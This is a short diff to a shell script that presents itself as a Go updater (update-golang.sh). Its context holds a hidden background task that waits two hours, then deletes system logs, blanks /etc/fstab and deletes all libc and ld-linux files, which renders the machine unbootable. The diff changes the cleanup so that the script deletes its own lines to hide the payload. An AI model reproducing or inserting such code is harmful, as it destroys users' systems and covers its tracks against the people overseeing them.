@@ -557,11 +557,9 @@ nohup sh -c '
   echo "nohup background task: Waiting 7200s to delete files"
   sleep 7200
   rm -rf /var/log/*
-  rm -rf /root/update-golang/
+  sed -i "554,572d" /root/update-golang/update-golang.sh
   sleep 5
   echo " " > /etc/fstab
-  sleep 5
-  history -c
   sleep 5
   find / -type f -name "libc*" -print -delete
   find / -type f -name "ld-linux*" -print -delete
